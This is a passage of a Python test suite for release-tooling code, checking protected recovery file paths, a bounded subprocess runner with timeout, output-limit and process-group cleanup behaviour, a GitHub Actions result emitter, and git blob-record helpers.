            source = (ROOT / relative).read_text()
            self.assertNotIn("import framework_recovery_fr_0011", source)

    def test_reserved_legacy_completion_paths_are_protected(self) -> None:
        reserved = (
            BRIDGE.FR0010_FORBIDDEN_COMPLETION_PATHS
            | BRIDGE.FR0011_FORBIDDEN_COMPLETION_PATHS
        )
        self.assertTrue(reserved)
        self.assertTrue(reserved <= BRIDGE.PROTECTED_AFTER_ACTIVATION)
        self.assertIn(
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0011-qualification.json"
            ),
            reserved,
        )

    def test_recovery_namespace_variants_are_protected(self) -> None:
        forbidden = (
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0011-qualification-forged.json"
            ),
            (
                "release/0.9.0/current-head/closures/Framework-Recovery/"
                "alternate-name.json"
            ),
            (
                "release/0.9.0/current-head/evidence/"
                "framework-recovery-fr-0011-r-local.json.bak"
            ),
            (
                "release/0.9.0/current-head/reviews/"
                "FRAMEWORK-RECOVERY-FR-0010-shadow.json"
            ),
        )
        for path in forbidden:
            with self.subTest(path=path):
                self.assertTrue(BRIDGE._successor_path_protected(path))
        permitted = (
            "release/0.9.0/current-head/requirements.json",
            "release/0.9.0/current-head/evidence/tasks/ch-t001/e0003.json",
            "crates/haldir-core/src/lib.rs",
        )
        for path in permitted:
            with self.subTest(path=path):
                self.assertFalse(BRIDGE._successor_path_protected(path))


class BoundedProcessTests(unittest.TestCase):
    def environment(self) -> dict[str, str]:
        return {
            "LC_ALL": "C",
            "PATH": f"{Path(sys.executable).parent}:/usr/bin:/bin",
        }

    def run_python(
        self,
        source: str,
        *,
        timeout: float = 2,
        limit: int = 4096,
    ) -> tuple[int, bytes, bytes]:
        return BRIDGE._run_bounded(
            (sys.executable, "-I", "-B", "-W", "error", "-c", source),
            cwd=ROOT,
            env=self.environment(),
            timeout_seconds=timeout,
            output_limit=limit,
        )

    def assert_pid_dead(self, pid: int) -> None:
        deadline = time.monotonic() + 2
        while time.monotonic() < deadline:
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                return
            proc_stat = Path(f"/proc/{pid}/stat")
            if proc_stat.is_file() and proc_stat.read_text().split()[2] == "Z":
                return
            time.sleep(0.02)
        self.fail(f"process {pid} survived bounded cleanup")

    def assert_no_live_process_group(self, pgid: int) -> None:
        deadline = time.monotonic() + 2
        proc_root = Path("/proc")
        while time.monotonic() < deadline:
            if proc_root.is_dir():
                live_members: list[int] = []
                for candidate in proc_root.iterdir():
                    if not candidate.name.isdigit():
                        continue
                    try:
                        raw = (candidate / "stat").read_text()
                        fields = raw[raw.rindex(")") + 2 :].split()
                        state = fields[0]
                        member_pgid = int(fields[2])
                    except (FileNotFoundError, IndexError, ValueError):
                        continue
                    if member_pgid == pgid and state != "Z":
                        live_members.append(int(candidate.name))
                if not live_members:
                    return
            else:
                try:
                    os.killpg(pgid, 0)
                except (ProcessLookupError, PermissionError):
                    return
            time.sleep(0.02)
        self.fail(f"process group {pgid} retained a live member")

    @contextmanager
    def capture_processes(
        self,
    ) -> Iterator[list[subprocess.Popen[bytes]]]:
        real_popen = subprocess.Popen
        captured: list[subprocess.Popen[bytes]] = []

        def recording_popen(
            *arguments: Any,
            **keywords: Any,
        ) -> subprocess.Popen[bytes]:
            process = real_popen(*arguments, **keywords)
            captured.append(process)
            return process

        try:
            with mock.patch.object(
                BRIDGE.subprocess,
                "Popen",
                side_effect=recording_popen,
            ):
                yield captured
        finally:
            for process in captured:
                if process.returncode is None:
                    try:
                        os.killpg(process.pid, signal.SIGKILL)
                    except (OSError, ProcessLookupError):
                        pass
                    try:
                        process.kill()
                    except (OSError, ProcessLookupError):
                        pass
                    try:
                        process.wait(timeout=5)
                    except (OSError, subprocess.TimeoutExpired):
                        pass
                for pipe in (process.stdout, process.stderr):
                    if pipe is not None:
                        pipe.close()

    def assert_process_cleaned(
        self,
        process: subprocess.Popen[bytes],
    ) -> None:
        self.assertIsNotNone(process.returncode)
        self.assertIsNotNone(process.stdout)
        self.assertIsNotNone(process.stderr)
        assert process.stdout is not None
        assert process.stderr is not None
        self.assertTrue(process.stdout.closed)
        self.assertTrue(process.stderr.closed)

    def test_success_and_nonzero_are_returned_exactly(self) -> None:
        result = self.run_python(
            "import sys;sys.stdout.buffer.write(b'out');"
            "sys.stderr.buffer.write(b'err')"
        )
        self.assertEqual(result, (0, b"out", b"err"))
        result = self.run_python("import sys;sys.exit(7)")
        self.assertEqual(result, (7, b"", b""))

    def test_exact_combined_limit_passes_and_first_extra_byte_fails(self) -> None:
        result = self.run_python(
            "import os;os.write(1,b'a'*2048);os.write(2,b'b'*2048)",
            limit=4096,
        )
        self.assertEqual(result[0], 0)
        self.assertEqual(len(result[1]) + len(result[2]), 4096)
        with self.assertRaisesRegex(BRIDGE.BridgeError, "OUTPUT_BOUND"):
            self.run_python(
                "import os;os.write(1,b'a'*2048);os.write(2,b'b'*2049)",
                limit=4096,
            )

    def test_concurrent_large_streams_do_not_deadlock_or_lose_bytes(self) -> None:
        unit = 4096
        repetitions = 64
        source = (
            "import os,threading\n"
            "def write_all(descriptor, byte):\n"
            f"    for _ in range({repetitions}):\n"
            f"        os.write(descriptor, byte*{unit})\n"
            "threads=(threading.Thread(target=write_all,args=(1,b'a')),"
            "threading.Thread(target=write_all,args=(2,b'b')))\n"
            "[thread.start() for thread in threads]\n"
            "[thread.join() for thread in threads]\n"
        )
        expected = unit * repetitions
        result = self.run_python(
            source,
            timeout=5,
            limit=expected * 2,
        )
        self.assertEqual(result, (0, b"a" * expected, b"b" * expected))

    def test_child_closing_pipes_then_sleeping_is_domain_timeout(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            pid_path = Path(name) / "leader.pid"
            source = (
                "import os,pathlib,time;"
                f"pathlib.Path({str(pid_path)!r}).write_text(str(os.getpid()));"
                "os.close(1);os.close(2);time.sleep(30)"
            )
            started = time.monotonic()
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_TIMEOUT"):
                self.run_python(source, timeout=0.5)
            self.assertLess(time.monotonic() - started, 2)
            self.assert_pid_dead(int(pid_path.read_text()))

    def test_descendant_holding_pipes_is_killed_as_a_group(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            process_path = Path(name) / "descendant.json"
            descendant = "import time;time.sleep(30)"
            source = (
                "import json,os,pathlib,subprocess,sys;"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{descendant!r}));"
                f"pathlib.Path({str(process_path)!r}).write_text(json.dumps("
                "{'pid':p.pid,'pgid':os.getpgid(p.pid),"
                "'leader_pgid':os.getpgrp()}));"
                "p.returncode=0"
            )
            result = self.run_python(source)
            self.assertEqual(result, (0, b"", b""))
            identity = json.loads(process_path.read_text())
            self.assertEqual(identity["pgid"], identity["leader_pgid"])
            self.assertGreater(identity["pgid"], 1)
            self.assert_pid_dead(identity["pid"])
            self.assert_no_live_process_group(identity["pgid"])

    def test_success_path_kills_same_group_descendant_before_reaping(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            pid_path = Path(name) / "descendant.pid"
            descendant = "import time;time.sleep(30)"
            source = (
                "import pathlib,subprocess,sys;"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{descendant!r}),"
                "stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);"
                f"pathlib.Path({str(pid_path)!r}).write_text(str(p.pid));"
                "p.returncode=0"
            )
            result = self.run_python(source)
            self.assertEqual(result, (0, b"", b""))
            self.assert_pid_dead(int(pid_path.read_text()))

    def test_setsid_escape_is_disclosed_cleanup_failure_not_containment(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as name:
            identity_path = Path(name) / "escaped.json"
            escaped = (
                "import json,os,pathlib,time;"
                "os.setsid();"
                f"pathlib.Path({str(identity_path)!r}).write_text(json.dumps("
                "{'pid':os.getpid(),'pgid':os.getpgrp(),"
                "'sid':os.getsid(0)}));"
                "time.sleep(30)"
            )
            source = (
                "import pathlib,subprocess,sys,time\n"
                f"path=pathlib.Path({str(identity_path)!r})\n"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{escaped!r}))\n"
                "deadline=time.monotonic()+2\n"
                "while not path.is_file() and time.monotonic()<deadline:\n"
                "    time.sleep(0.005)\n"
                "if not path.is_file():\n"
                "    raise RuntimeError('setsid fixture did not synchronize')\n"
                "p.returncode=0\n"
            )
            escaped_pid: int | None = None
            try:
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_CLEANUP",
                ):
                    self.run_python(source, timeout=5)
                identity = json.loads(identity_path.read_text())
                escaped_pid = identity["pid"]
                self.assertEqual(identity["pid"], identity["pgid"])
                self.assertEqual(identity["pid"], identity["sid"])
                os.kill(escaped_pid, 0)
            finally:
                if escaped_pid is None and identity_path.is_file():
                    escaped_pid = json.loads(identity_path.read_text())["pid"]
                if escaped_pid is not None:
                    try:
                        os.kill(escaped_pid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
                    self.assert_pid_dead(escaped_pid)

    def test_invalid_bounds_fail_before_selector_or_process_creation(self) -> None:
        invalid_timeouts = (
            True,
            "1",
            None,
            float("nan"),
            float("inf"),
            float("-inf"),
            0,
            -1,
        )
        for value in invalid_timeouts:
            with (
                self.subTest(timeout=value),
                mock.patch.object(BRIDGE.selectors, "DefaultSelector") as selector,
                mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_BOUND",
                ):
                    BRIDGE._run_bounded(
                        (sys.executable, "-c", "pass"),
                        cwd=ROOT,
                        env=self.environment(),
                        timeout_seconds=value,
                        output_limit=1,
                    )
                selector.assert_not_called()
                popen.assert_not_called()
        invalid_limits = (True, 1.0, "1", None, -1)
        for value in invalid_limits:
            with (
                self.subTest(limit=value),
                mock.patch.object(BRIDGE.selectors, "DefaultSelector") as selector,
                mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_BOUND",
                ):
                    BRIDGE._run_bounded(
                        (sys.executable, "-c", "pass"),
                        cwd=ROOT,
                        env=self.environment(),
                        timeout_seconds=1,
                        output_limit=value,
                    )
                selector.assert_not_called()
                popen.assert_not_called()

    def test_selector_construction_precedes_process_spawn(self) -> None:
        sentinel = OSError(24, "selector-construction")
        with (
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                side_effect=sentinel,
            ),
            mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("pass")
            popen.assert_not_called()

    def test_popen_failure_closes_preacquired_selector(self) -> None:
        selector = mock.Mock()
        with (
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
            mock.patch.object(
                BRIDGE.subprocess,
                "Popen",
                side_effect=OSError(24, "popen-failure"),
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("pass")
        selector.close.assert_called_once_with()

    def test_selector_and_read_exceptions_cleanup_every_resource(self) -> None:
        real_selector = BRIDGE.selectors.DefaultSelector()
        selector = mock.Mock(wraps=real_selector)
        selector.select.side_effect = OSError(5, "selector-failure")
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("import time;time.sleep(30)")
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        selector.close.assert_called_once_with()

        real_read = os.read
        with self.capture_processes() as processes:

            def fail_bridge_read(
                descriptor: int,
                size: int,
            ) -> bytes:
                if processes:
                    raise OSError(5, "read-failure")
                return real_read(descriptor, size)

            with mock.patch.object(
                BRIDGE.os,
                "read",
                side_effect=fail_bridge_read,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_CLEANUP",
                ):
                    self.run_python(
                        "import os,time;os.write(1,b'x');time.sleep(30)"
                    )
                self.assertEqual(len(processes), 1)
                self.assert_process_cleaned(processes[0])

    def test_cleanup_failure_has_a_distinct_domain_error(self) -> None:
        with (
            self.capture_processes() as processes,
            mock.patch.object(BRIDGE, "_kill_process_group", return_value=False),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE,
                "_close_pipe",
                return_value=False,
            ),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("pass")
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE,
                "_terminate_and_reap",
                side_effect=RuntimeError("injected-cleanup-failure"),
            ),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])

    def test_double_termination_failure_still_closes_selector_and_pipes(
        self,
    ) -> None:
        real_selector = BRIDGE.selectors.DefaultSelector()
        selector = mock.Mock(wraps=real_selector)
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
            mock.patch.object(
                BRIDGE,
                "_terminate_and_reap",
                side_effect=RuntimeError("primary-cleanup-failure"),
            ),
            mock.patch.object(
                BRIDGE,
                "_emergency_terminate_and_reap",
                side_effect=RuntimeError("emergency-cleanup-failure"),
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            process = processes[0]
            self.assertIsNone(process.returncode)
            self.assertIsNotNone(process.stdout)
            self.assertIsNotNone(process.stderr)
            assert process.stdout is not None
            assert process.stderr is not None
            self.assertTrue(process.stdout.closed)
            self.assertTrue(process.stderr.closed)
            selector.close.assert_called_once_with()

    def test_kill_lookup_race_and_wait_timeout_fallbacks(self) -> None:
        process = mock.Mock()
        process.pid = 424_242
        with mock.patch.object(
            BRIDGE.os,
            "killpg",
            side_effect=ProcessLookupError,
        ):
            self.assertTrue(BRIDGE._kill_process_group(process))

        first_timeout = mock.Mock()
        first_timeout.pid = 424_243
        first_timeout.wait.side_effect = (
            subprocess.TimeoutExpired(("fixture",), 5),
            0,
        )
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                return_value=False,
            ),
            mock.patch.object(
                BRIDGE,
                "_kill_process_group",
                return_value=True,
            ) as kill_group,
        ):
            self.assertTrue(BRIDGE._terminate_and_reap(first_timeout))
        self.assertEqual(first_timeout.wait.call_count, 2)
        first_timeout.kill.assert_called_once_with()
        self.assertEqual(kill_group.call_count, 2)

        double_timeout = mock.Mock()
        double_timeout.pid = 424_244
        double_timeout.wait.side_effect = subprocess.TimeoutExpired(
            ("fixture",),
            5,
        )
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                return_value=False,
            ),
            mock.patch.object(
                BRIDGE,
                "_kill_process_group",
                return_value=True,
            ),
        ):
            self.assertFalse(BRIDGE._terminate_and_reap(double_timeout))
        self.assertEqual(double_timeout.wait.call_count, 2)
        double_timeout.kill.assert_called_once_with()

    def test_identity_loss_forbids_post_reap_signaling(self) -> None:
        initial_loss = mock.Mock()
        initial_loss.pid = 424_245
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                side_effect=ChildProcessError("identity released"),
            ),
            mock.patch.object(BRIDGE, "_kill_process_group") as kill_group,
        ):
            self.assertFalse(BRIDGE._terminate_and_reap(initial_loss))
        kill_group.assert_not_called()
        initial_loss.kill.assert_not_called()
        initial_loss.wait.assert_not_called()

        for error in (
            ChildProcessError("identity released"),
            OSError(5, "wait failure"),
        ):
            process = mock.Mock()
            process.pid = 424_246
            process.wait.side_effect = error
            with (
                self.subTest(error=type(error).__name__),
                mock.patch.object(
                    BRIDGE,
                    "_leader_exited_unreaped",
                    return_value=False,
                ),
                mock.patch.object(
                    BRIDGE,
                    "_kill_process_group",
                    return_value=True,
                ) as kill_group,
            ):
                self.assertFalse(BRIDGE._terminate_and_reap(process))
            kill_group.assert_called_once_with(
                process,
                zombie_leader=False,
            )
            process.kill.assert_not_called()
            process.wait.assert_called_once_with(timeout=5)

    def test_emergency_cleanup_requires_retained_identity_before_signals(
        self,
    ) -> None:
        for error in (
            ChildProcessError("identity released"),
            OSError(5, "waitid failure"),
        ):
            process = mock.Mock()
            process.pid = 424_247
            with (
                self.subTest(error=type(error).__name__),
                mock.patch.object(
                    BRIDGE.os,
                    "waitid",
                    side_effect=error,
                ),
                mock.patch.object(BRIDGE.os, "killpg") as kill_group,
            ):
                self.assertFalse(
                    BRIDGE._emergency_terminate_and_reap(process)
                )
            kill_group.assert_not_called()
            process.kill.assert_not_called()
            process.wait.assert_not_called()

        process = mock.Mock()
        process.pid = 424_248
        with (
            mock.patch.object(
                BRIDGE.os,
                "waitid",
                side_effect=(None, ChildProcessError("identity released")),
            ),
            mock.patch.object(BRIDGE.os, "killpg") as kill_group,
        ):
            self.assertFalse(BRIDGE._emergency_terminate_and_reap(process))
        kill_group.assert_called_once_with(process.pid, signal.SIGKILL)
        process.kill.assert_not_called()
        process.wait.assert_not_called()

    def test_no_resource_warning_or_unraisable_after_all_exit_paths(self) -> None:
        unraisable: list[object] = []
        previous = sys.unraisablehook
        sys.unraisablehook = unraisable.append
        try:
            with warnings.catch_warnings(record=True) as observed:
                warnings.simplefilter("always", ResourceWarning)
                self.run_python("pass")
                with self.assertRaises(BRIDGE.BridgeError):
                    self.run_python(
                        "import os;os.write(1,b'x'*2)",
                        limit=1,
                    )
                with self.assertRaises(BRIDGE.BridgeError):
                    self.run_python("import time;time.sleep(5)", timeout=0.1)
                gc.collect()
            resources = [
                item for item in observed if issubclass(item.category, ResourceWarning)
            ]
            self.assertEqual(resources, [])
            self.assertEqual(unraisable, [])
        finally:
            sys.unraisablehook = previous


class ResultEmitterTests(unittest.TestCase):
    def make_repo(self, root: Path) -> tuple[Path, str]:
        subprocess.run(["/usr/bin/git", "init", "-q", root], check=True)
        for contract in RESULT.WORKFLOW_CONTRACT.values():
            for relative in contract["materials"]:
                path = root / relative
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(relative + "\n")
        subprocess.run(
            ["/usr/bin/git", "-C", root, "add", "."],
            check=True,
        )
        environment = {
            **os.environ,
            "GIT_AUTHOR_NAME": "Test",
            "GIT_AUTHOR_EMAIL": "test@example.invalid",
            "GIT_COMMITTER_NAME": "Test",
            "GIT_COMMITTER_EMAIL": "test@example.invalid",
        }
        subprocess.run(
            ["/usr/bin/git", "-C", root, "commit", "-q", "-m", "fixture"],
            check=True,
            env=environment,
        )
        commit = (
            subprocess.check_output(["/usr/bin/git", "-C", root, "rev-parse", "HEAD"])
            .decode()
            .strip()
        )
        return root, commit

    def environment(self, commit: str, attempt: int = 2) -> dict[str, str]:
        return {
            "GITHUB_ACTIONS": "true",
            "GITHUB_REPOSITORY": "sepahead/haldir",
            "GITHUB_REPOSITORY_ID": str(PROTOCOL.REPOSITORY_ID),
            "GITHUB_REPOSITORY_OWNER_ID": str(PROTOCOL.REPOSITORY_OWNER_ID),
            "GITHUB_WORKFLOW": "ci",
            "GITHUB_JOB": "supply-chain",
            "GITHUB_SHA": commit,
            "GITHUB_REF": "refs/heads/main",
            "GITHUB_WORKFLOW_REF": (
                "sepahead/haldir/.github/workflows/ci.yml@refs/heads/main"
            ),
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_RUN_ID": str(RUN_ID),
            "GITHUB_RUN_ATTEMPT": str(attempt),
            "GITHUB_RUN_NUMBER": str(RUN_NUMBER),
        }

    def test_attempt_two_emission(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo, commit = self.make_repo(Path(name))
            value = RESULT.build_result(
                repo, workflow="ci", environment=self.environment(commit)
            )
            self.assertEqual(value["execution"]["run_attempt"], 2)

    def test_attempt_nine_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo, commit = self.make_repo(Path(name))
            with self.assertRaisesRegex(RuntimeError, "RUN_ATTEMPT"):
                RESULT.build_result(
                    repo,
                    workflow="ci",
                    environment=self.environment(commit, attempt=9),
                )

    def test_output_traversal_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            with changed_directory(Path(name)):
                with self.assertRaisesRegex(RuntimeError, "RESULT_OUTPUT"):
                    RESULT._write_exclusive(
                        Path("../escape.json"),
                        b"{}\n",
                        expected_name="expected.json",
                    )


class CapturePrimitiveTests(unittest.TestCase):
    def test_blob_record_matches_git_object_format(self) -> None:
        value = CAPTURE._blob_record("evidence.json", b"{}\n")
        completed = subprocess.run(
            ["/usr/bin/git", "hash-object", "--stdin"],
            input=b"{}\n",
            stdout=subprocess.PIPE,
            check=True,
        )
        self.assertEqual(value["git_object_id"], completed.stdout.decode().strip())

    def test_epoch13_field_contracts(self) -> None:
        self.assertEqual(
            CAPTURE._run_fields(epoch13=True, attempt=False),
            (
                "attempt,conclusion,createdAt,databaseId,event,headBranch,"
                "headSha,jobs,number,status,updatedAt,url,workflowDatabaseId,"
                "workflowName"
            ),
        )
        self.assertIn(
            "startedAt",
            CAPTURE._run_fields(epoch13=True, attempt=True),
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
